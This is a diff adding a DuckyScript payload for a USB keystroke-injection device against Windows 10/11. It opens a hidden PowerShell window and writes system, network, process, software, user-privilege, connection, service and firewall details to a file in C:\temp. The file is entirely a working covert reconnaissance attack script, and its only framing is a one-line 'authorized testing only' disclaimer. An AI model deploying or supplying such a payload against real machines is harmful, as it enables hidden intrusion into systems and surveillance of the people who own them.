@@ -1,0 +1,84 @@
+REM Title: Windows System Reconnaissance
+REM Author: David Osisek (CamoZeroDay)
+REM Target: Windows 10/11
+REM Version: 1.0
+REM Category: Reconnaissance
+REM
+REM ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY
+REM Quick system enumeration and info gathering
+
+DELAY 1000
+
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1500
+
+REM Set output file
+STRING $out='C:\temp\recon.txt'
+ENTER
+STRING New-Item -ItemType Directory -Force -Path C:\temp
+ENTER
+DELAY 500
+
+REM System Info
+STRING '=== SYSTEM INFO ===' | Out-File $out
+ENTER
+STRING systeminfo | Out-File -Append $out
+ENTER
+DELAY 3000
+
+REM Network Config
+STRING '=== NETWORK ===' | Out-File -Append $out
+ENTER
+STRING ipconfig /all | Out-File -Append $out
+ENTER
+DELAY 2000
+
+REM Running Processes
+STRING '=== PROCESSES ===' | Out-File -Append $out
+ENTER
+STRING Get-Process | Sort CPU -Descending | Select -First 20 | Out-File -Append $out
+ENTER
+DELAY 2000
+
+REM Installed Software
+STRING '=== SOFTWARE ===' | Out-File -Append $out
+ENTER
+STRING Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion | Out-File -Append $out
+ENTER
+DELAY 2000
+
+REM Current User
+STRING '=== USER ===' | Out-File -Append $out
+ENTER
+STRING whoami /all | Out-File -Append $out
+ENTER
+DELAY 1000
+
+REM Network Connections
+STRING '=== CONNECTIONS ===' | Out-File -Append $out
+ENTER
+STRING netstat -ano | Out-File -Append $out
+ENTER
+DELAY 1000
+
+REM Services
+STRING '=== SERVICES ===' | Out-File -Append $out
+ENTER
+STRING Get-Service | Where {$_.Status -eq 'Running'} | Out-File -Append $out
+ENTER
+DELAY 2000
+
+REM Firewall
+STRING '=== FIREWALL ===' | Out-File -Append $out
+ENTER
+STRING netsh advfirewall show allprofiles | Out-File -Append $out
+ENTER
+DELAY 1000
+
+REM Exit
+STRING exit
+ENTER
